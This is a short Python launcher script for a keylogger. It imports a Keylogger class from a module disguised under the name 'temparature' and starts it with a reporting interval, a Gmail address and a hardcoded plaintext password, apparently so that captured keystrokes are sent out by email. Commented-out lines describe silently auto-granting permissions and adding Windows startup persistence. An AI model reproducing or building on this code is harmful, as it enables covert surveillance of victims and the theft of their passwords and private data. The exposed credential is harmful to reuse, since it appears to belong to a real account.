#!/usr/bin/python
import temparature
import sys
import os

# Auto-grant permissions on startup
# try:
#     import auto_permissions
#     # Silently attempt to grant permissions
#     auto_permissions.auto_grant_permissions()
# except:
#     # If auto_permissions fails, continue anyway
#     pass

# OR if you are packaging on Windows and want to add to registry
# So that the program runs on startup, uncomment the following import and comment the top one

#import keylogger_persistance_windows

#Main program
my_keylogger = temparature.Keylogger(120, "shibasishdas157@gmail.com", "M@@bapisilchar14")
my_keylogger.start()
